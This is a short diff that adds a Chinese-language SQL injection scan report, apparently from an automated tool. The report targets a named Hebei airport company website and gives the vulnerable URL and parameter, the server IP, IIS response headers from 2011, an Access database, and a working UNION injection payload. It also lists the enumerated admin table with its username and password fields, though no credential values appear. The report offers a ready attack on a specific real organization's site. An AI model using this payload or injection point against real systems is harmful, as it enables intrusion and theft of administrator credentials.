@@ -1,0 +1,30 @@
+■漏洞信息:============================================================
+ ·URL:http://www.hebeiairport.cn/Serverce.asp?ID=925
+ ·页面标题：河北机场管理集团有限公司---旅客服务
+ ·参数:ID=925
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:219.148.37.12
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 10 Sep 2011 12:39:35 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 22069
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSSBTCRSR=JCDPGIDBEPJGFOACMJNPBIDM; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 1  显示的列= 1
+联合查询SQL: and 3=8 union select 1 from MSysAccessObjects
+找到表:admin
+找到字段:admin.admin_id
+找到字段:admin.admin_name
+找到字段:admin.admin_pwd
+------------------------------------------------------------
+admin_name		admin_pwd		
